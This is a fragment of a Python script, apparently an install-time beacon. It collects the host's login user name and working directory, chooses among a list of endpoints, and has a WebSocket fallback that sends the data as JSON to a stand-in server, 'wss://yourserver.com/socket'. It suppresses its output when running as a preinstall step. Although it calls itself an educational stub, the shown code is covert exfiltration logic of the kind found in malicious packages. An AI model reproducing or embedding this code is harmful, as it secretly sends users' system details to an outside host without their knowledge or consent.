...
def collect_system_info():
    return {
        ...
        "whoamiUser": os.getlogin() if hasattr(os, "getlogin") else os.environ.get("USER", "unknown"),
        "currentDirectory": os.getcwd(),
    }

# Random endpoint picker
endpoints = [
...
# Optional WebSocket fallback (not actually connected — educational stub)
def send_via_websocket(data):
    try:
        import websocket  # Requires `websocket-client` library
        ws = websocket.WebSocket()
        ws.connect("wss://yourserver.com/socket")  # Replace with real test server if needed
        ws.send(json.dumps(data))
        ws.close()
        if not is_preinstall:
            print("[*] WebSocket fallback used.")
    except Exception as e:
        if not is_preinstall:
